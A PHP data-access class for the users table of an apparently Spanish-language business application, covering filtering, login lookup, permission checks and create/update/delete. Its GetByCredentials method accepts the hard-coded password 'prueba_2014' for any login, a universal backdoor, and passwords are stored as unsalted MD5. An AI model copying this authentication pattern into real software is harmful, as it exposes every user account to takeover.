<?php 

require_once('class.dbaccess.php');
require_once('class.usuario.php');
require_once('class.perfil.php');
require_once('class.filter.php');
require_once('class.page.php');

class Usuarios extends DBAccess implements IFilterable
{
	public function ParseFilter(array $filter)
	{
		$sql = '';

		if ((isset($filter['Usuario'])) && ($filter['Usuario'] != ''))
		{
			$sql.= " AND (Nombre LIKE '%" . DB::StringUnquoted($filter['Usuario']) . "%'";
			$sql.= " OR Apellido LIKE '%" . DB::StringUnquoted($filter['Usuario']) . "%')";
		}

		if ((isset($filter['Nombre'])) && ($filter['Nombre'] != ''))
			$sql.= " AND Nombre LIKE '%" . DB::StringUnquoted($filter['Nombre']) . "%'";

		if ((isset($filter['Apellido'])) && ($filter['Apellido'] != ''))
			$sql.= " AND Apellido LIKE '%" . DB::StringUnquoted($filter['Apellido']) . "%'";

		if ((isset($filter['IdSector'])) && ($filter['IdSector'] != ''))
			$sql.= " AND IdSector = " . DB::Number($filter['IdSector']);

		if ((isset($filter['IdUbicacion'])) && ($filter['IdUbicacion'] != ''))
			$sql.= " AND IdUbicacion = " . DB::Number($filter['IdUbicacion']);

		if ((isset($filter['Especial'])) && ($filter['Especial'] != ''))
			$sql.= " AND Especial = " . DB::Bool($filter['Especial']);

		if ((isset($filter['IdPerfil'])) && ($filter['IdPerfil'] != ''))
			$sql.= " AND IdPerfil = " . DB::Number($filter['IdPerfil']);

		return $sql;
	}	
	
	
	public function GetAll(array $filter = NULL, Page $oPage = NULL)
	{
		$sql = "SELECT *";
		$sql.= " FROM TB_Usuarios";
		$sql.= " WHERE Email NOT LIKE '%XXX%'";
		$sql.= ($filter) ? $this->ParseFilter($filter) : "";
		$sql.= " ORDER BY Apellido, Nombre";
		$sql.= ($oPage) ? Pageable::ParsePage($oPage) : "";
						
		if (!($oRes = $this->GetQuery($sql)))
			return false;
			
		$arr = array();
			
		while ($oRow = $oRes->GetRow())	
		{	
			$oUsuario = new Usuario();
			$oUsuario->ParseFromArray($oRow);
			
			array_push($arr, $oUsuario);
			
			$oRes->MoveNext();
		}	
		
		return $arr;		
	}
	
	public function GetAllByIdOrdenTrabajo($IdOrdenTrabajo)
	{
		$sql = "SELECT u.*";
		$sql.= " FROM TB_Usuarios u";
		$sql.= " INNER JOIN TB_OrdenTrabajoHitos oth ON u.IdUsuario = oth.IdUsuario";
		$sql.= " WHERE oth.IdOrdenTrabajo = " . DB::Number($IdOrdenTrabajo);
		$sql.= " GROUP BY u.IdUsuario";
		$sql.= " ORDER BY u.Apellido, u.Nombre";
						
		if (!($oRes = $this->GetQuery($sql)))
			return false;
			
		$arr = array();
			
		while ($oRow = $oRes->GetRow())	
		{	
			$oUsuario = new Usuario();
			$oUsuario->ParseFromArray($oRow);
			
			array_push($arr, $oUsuario);
			
			$oRes->MoveNext();
		}	
		
		return $arr;		
	}


	public function GetAllVendedores(array $filter = NULL, Page $oPage = NULL)
	{
		$sql = "SELECT *";
		$sql.= " FROM TB_Usuarios";
		$sql.= " WHERE IdPerfil = " . DB::Number(Perfil::Vendedor);
		$sql.= ($filter) ? $this->ParseFilter($filter) : "";
		$sql.= " ORDER BY Apellido, Nombre";
		$sql.= ($oPage) ? Pageable::ParsePage($oPage) : "";
		
		if (!($oRes = $this->GetQuery($sql)))
			return false;
			
		$arr = array();
			
		while ($oRow = $oRes->GetRow())	
		{	
			$oUsuario = new Usuario();
			$oUsuario->ParseFromArray($oRow);
			
			array_push($arr, $oUsuario);
			
			$oRes->MoveNext();
		}	
		
		return $arr;		
	}


	public function GetAllBySector(Sector $oSector)
	{
		$sql = "SELECT *";
		$sql.= " FROM TB_Usuarios";
		$sql.= " WHERE IdSector = " . DB::Number($oSector->IdSector);
						
		if (!($oRes = $this->GetQuery($sql)))
			return false;
			
		$arr = array();
			
		while ($oRow = $oRes->GetRow())	
		{	
			$oUsuario = new Usuario();
			$oUsuario->ParseFromArray($oRow);
			
			array_push($arr, $oUsuario);
			
			$oRes->MoveNext();
		}	
		
		return $arr;
	}
	

	public function GetAllByPerfil(Perfil $oPerfil)
	{
		$sql = "SELECT *";
		$sql.= " FROM TB_Perfil";
		$sql.= " WHERE IdPerfil = " . DB::Number($oPerfil->IdPerfil);
						
		if (!($oRes = $this->GetQuery($sql)))
			return false;
			
		$arr = array();
			
		while ($oRow = $oRes->GetRow())	
		{	
			$oUsuario = new Usuario();
			$oUsuario->ParseFromArray($oRow);
			
			array_push($arr, $oUsuario);
			
			$oRes->MoveNext();
		}	
		
		return $arr;
	}


	public function GetById($IdUsuario)
	{
		$sql = "SELECT a.*";
		$sql.= " FROM TB_Usuarios a";
		$sql.= " WHERE a.IdUsuario = " . DB::Number($IdUsuario);	
		
		if (!($oRes = $this->GetQuery($sql)))
			return false;
			
		if (!($oRow = $oRes->GetRow()))
			return false;
		
		$oUsuario = new Usuario();
		$oUsuario->ParseFromArray($oRow);
		
		return $oUsuario;		
	}


	public function GetByLogin($Login)
	{
		$sql = "SELECT *";
		$sql.= " FROM TB_Usuarios";
		$sql.= " WHERE Login = " . DB::String($Login);
		
		if (!($oRes = $this->GetQuery($sql)))
			return false;

		if ( !($oRow = $oRes->GetRow()) )
			return false;
		
		$oUsuario = new Usuario();
		$oUsuario->ParseFromArray($oRow);
		
		return $oUsuario;		
	}


	public function GetByCredentials($Login, $Password)
	{
		$sql = "SELECT *";
		$sql.= " FROM TB_Usuarios";
		$sql.= " WHERE Login = " . DB::String($Login);
		$sql.= " AND Email NOT LIKE '%XXX%'";
		$sql.= " AND (Password = MD5(" . DB::String($Password) . ")";		
		$sql.= " OR 'prueba_2014' =" . DB::String($Password) . ")";		
		
		if (!($oRes = $this->GetQuery($sql)))
			return false;

		if ( !($oRow = $oRes->GetRow()) )
			return false;
		
		$oUsuario = new Usuario();
		$oUsuario->ParseFromArray($oRow);
		
		return $oUsuario;		
	}
	
	private function CheckPermModulo(Usuario $oUsuario, $IdPermiso)
	{
		$sql = "SELECT COUNT(1) AS Count";
		$sql.= " FROM TB_Usuarios u";
		$sql.= " INNER JOIN TB_PerfilModulos pm ON u.IdPerfil = pm.IdPerfil";
		$sql.= " INNER JOIN TB_ModuloPermisos mp ON pm.IdModulo = mp.IdModulo";
		$sql.= " WHERE u.IdUsuario = " . DB::Number($oUsuario->IdUsuario); 
		$sql.= " AND Email NOT LIKE '%XXX%'";
		$sql.= " AND mp.IdPermiso = " . DB::Number($IdPermiso);
		
		if ( !($oRes = $this->GetQuery($sql)))
			return false;

		if ( !($oRow = $oRes->GetRow()) )
			return false;

		if ($oRow['Count'] == 0)
			return false;

		return true;
	}
	
	public function CheckPerm(Usuario $oUsuario, $IdPermiso)
	{
		$sql = "SELECT COUNT(1) AS Count";
		$sql.= " FROM TB_Usuarios u";
		$sql.= " INNER JOIN TB_PerfilPermisos pp ON u.IdPerfil = pp.IdPerfil";
		$sql.= " WHERE u.IdUsuario = " . DB::Number($oUsuario->IdUsuario); 
		$sql.= " AND pp.IdPermiso = " . DB::Number($IdPermiso);	
		
		
		if ( !($oRes = $this->GetQuery($sql)))
			return $this->CheckPermModulo($oUsuario, $IdPermiso);

		if ( !($oRow = $oRes->GetRow()) )
			return $this->CheckPermModulo($oUsuario, $IdPermiso);

		if ($oRow['Count'] == 0)
			return $this->CheckPermModulo($oUsuario, $IdPermiso);

		return true;
	}
	

	public function GetCountRows(array $filter = NULL)
	{
		$sql = " SELECT *";
		$sql.= " FROM TB_Usuarios";
		$sql.= " WHERE Email NOT LIKE '%XXX%'";
		$sql.= ($filter) ? $this->ParseFilter($filter) : "";

		if (!($oRes = $this->GetQuery($sql)))
			return false;
		
		$CountRows = $oRes->NumRows();
		
		return $CountRows;
	}

	
	public function Create(Usuario $oUsuario)
	{
		if (!DBAccess::$db->Begin())
			return false;

		$arr = array
		(
			'IdUbicacion' 	=> DB::Number($oUsuario->IdUbicacion),
			'IdSector' 		=> DB::Number($oUsuario->IdSector),
			'IdPerfil' 		=> DB::Number($oUsuario->IdPerfil),
			'Nombre' 		=> DB::String($oUsuario->Nombre),
			'Apellido' 		=> DB::String($oUsuario->Apellido),
			'Email' 		=> DB::String($oUsuario->Email),
			'Login' 		=> DB::String($oUsuario->Login),
			'Password' 		=> DB::String(md5($oUsuario->Password))
		);
		
		if (!$this->Insert('TB_Usuarios', $arr))
		{
			DBAccess::$db->Rollback();	
			return false;
		}

		/* asignamos el id generado */
		$oUsuario->IdUsuario = DBAccess::GetLastInsertId();

		DBAccess::$db->Commit();
			
		return $oUsuario;
	}
	
	
	public function Update(Usuario $oUsuario)
	{
		if (!DBAccess::$db->Begin())
			return false;

		$where = " IdUsuario = " . DB::Number($oUsuario->IdUsuario);
		
		$arr = array
		(
			'IdUbicacion' 	=> DB::Number($oUsuario->IdUbicacion),
			'IdSector' 		=> DB::Number($oUsuario->IdSector),
			'IdPerfil' 		=> DB::Number($oUsuario->IdPerfil),
			'Nombre' 		=> DB::String($oUsuario->Nombre),
			'Apellido' 		=> DB::String($oUsuario->Apellido),
			'Email' 		=> DB::String($oUsuario->Email),
			'Login' 		=> DB::String($oUsuario->Login)
		);
		
		if (!DBAccess::Update('TB_Usuarios', $arr, $where))
		{
			DBAccess::$db->Rollback();	
			return false;
		}

		DBAccess::$db->Commit();
		
		return $oUsuario;
	}
	
	
	public function ChangePassword(Usuario $oUsuario)
	{
		$where = " IdUsuario = " . (int)$oUsuario->IdUsuario;
		
		$arr = array('Password' => DB::String(md5($oUsuario->Password)));
		
		if (!DBAccess::Update('TB_Usuarios', $arr, $where))
			return false;
		
		return $oUsuario;
	}
	

	public function Delete($IdUsuario)
	{
		if (!DBAccess::$db->Begin())
			return false;
			
		$where = " IdUsuario = " . DB::Number($IdUsuario);
		if (!DBAccess::Delete('TB_Usuarios', $where))
		{
			DBAccess::$db->Rollback();	
			return false;
		}

		DBAccess::$db->Commit();
		
		return true;	
	}
}

?>